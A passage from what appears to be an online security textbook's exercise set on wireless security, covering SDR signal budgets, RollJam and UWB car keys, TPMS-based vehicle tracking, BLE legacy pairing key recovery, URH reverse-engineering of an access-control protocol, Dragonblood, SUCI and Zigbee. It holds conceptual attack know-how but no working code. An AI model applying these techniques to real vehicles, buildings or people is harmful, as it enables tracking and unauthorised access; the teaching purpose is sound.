+<p>An RTL-SDR v3 has a noise figure of 8 dB and a maximum sample rate of 2.4 MSPS. A weak 433 MHz signal has a received power of -110 dBm. The thermal noise floor at 293 K for 200 kHz bandwidth is <span class="arithmatex">\(kTB = -121\)</span> dBm. (a) Calculate the SNR at the RTL-SDR input for OOK demodulation. (b) Is the signal decodable? What LNA gain is needed to bring SNR to 15 dB?</p>
+</li>
+<li>
+<p>The RollJam attack stores a rolling code while jamming the channel. Modern UWB-based car keys (CCC Digital Key 3.0) are claimed to defeat relay attacks. (a) Explain the UWB ToF ranging mechanism and why a relay attack cannot defeat it. (b) Can RollJam be adapted to attack a UWB-based keyless entry system? Justify your answer with reference to the UWB ranging accuracy (<span class="arithmatex">\(\pm 10\)</span> cm) and relay timing overhead.</p>
+</li>
+<li>
+<p>TPMS (Tyre Pressure Monitoring Systems) sensors broadcast their 32-bit sensor ID in plaintext at 315 MHz. (a) An attacker wants to track a specific vehicle by its TPMS sensor ID. How far away can the attacker receive the TPMS signal using an RTL-SDR and a Yagi antenna with 10 dBi gain? (Assume TPMS TX power +10 dBm, free-space path loss at 315 MHz.) (b) Propose a privacy-preserving TPMS protocol that rotates the sensor ID while maintaining compatibility with the vehicle’s receiver.</p>
+</li>
+<li>
+<p>A Bluetooth Low Energy peripheral device uses LEGACY pairing (pre-Bluetooth 4.2) with Just Works association model. (a) What is the TK (Temporary Key) value used in LEGACY Just Works pairing? (b) How does an active eavesdropper during the pairing session recover the LTK (Long-Term Key)? (c) What pairing mode in Bluetooth 5.x prevents this attack?</p>
+</li>
+<li>
+<p>Universal Radio Hacker (URH) is used to reverse-engineer a proprietary 868 MHz wireless protocol used by a building access control system. The signal appears as FSK with 50 kHz deviation, 9600 baud, Manchester-encoded. Describe the step-by-step URH analysis workflow: (a) signal capture, (b) demodulation parameter identification, (c) bit sequence extraction, (d) protocol field identification (preamble, sync, address, command, CRC), (e) how to determine if replay attacks are possible.</p>
+</li>
+<li>
+<p>A WPA3-SAE network uses the Dragonfly handshake with a group-19 (NIST P-256) elliptic curve. (a) Describe the password element derivation (hunting-and-pecking algorithm). (b) What timing side-channel vulnerability was found in the original Dragonfly implementation (Dragonblood, Vanhoef 2019)? (c) How was this patched in WPA3 Release 2 (IEEE 802.11-2020)?</p>
+</li>
+<li>
+<p>A 5G NR base station (gNB) uses SUCI (Subscription Concealed Identifier) to protect the subscriber’s SUPI from IMSI catchers. SUCI uses ECIES with Curve25519 for the home network public key encryption. (a) Explain why SUCI prevents IMSI catcher (Stingray) attacks that succeeded against 2G/3G/4G. (b) What information does a 5G IMSI catcher still expose even with SUCI protection?</p>
+</li>
+<li>
+<p>An enterprise WLAN uses 802.1X authentication with EAP-TLS. Client certificates are stored in hardware (TPM 2.0, RSA-2048 key in TPM). (a) Describe the EAP-TLS handshake between the client, authenticator (AP), and authentication server (RADIUS). (b) What attack does TPM key storage prevent compared to software key storage? (c) Why does this not protect against a rogue AP attack, and what additional control (PMF / 802.11w) is needed?</p>
+</li>
+<li>
+<p>Zigbee uses IEEE 802.15.4 with O-QPSK modulation and DSSS (Direct Sequence Spread Spectrum) at 2.4 GHz. The spreading factor is 32 chips/bit. (a) Calculate the chip rate and the resulting processing gain (dB). (b) If a Wi-Fi 802.11n transmission at 2.437 GHz (channel 6) overlaps with Zigbee channel 11 (2.405 GHz), calculate the frequency separation and assess the interference risk based on the 802.11n channel width of 20 MHz.</p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="ch35-usb-and-thunderbolt-security.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: 35. USB and Thunderbolt Security">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                35. USB and Thunderbolt Security
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="ch37-confidential-computing-hardware.html" class="md-footer__link md-footer__link--next" aria-label="Next: 37. Confidential Computing Hardware">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                37. Confidential Computing Hardware
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Pustakālaya &middot;
+      <a href="../../about.html">About this edition</a> &middot;
+      © The authors of the books
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.prune", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "toc.follow", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+  
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/mathjax.js"></script>
+      
+        <script src="../../assets/reader.js"></script>
+      
+        <script src="../../assets/app.js"></script>
+      
+    
+  <script>
+    /* offline reading: the service worker at the site root (its scope is the whole site) */
+    if ("serviceWorker" in navigator && window.isSecureContext) {
+      window.addEventListener("load", function () {
+        navigator.serviceWorker.register(new URL("../../sw.js", location.href).href).catch(function () {});
+      });
+    }
+  </script>
+
+  </body>
+</html>
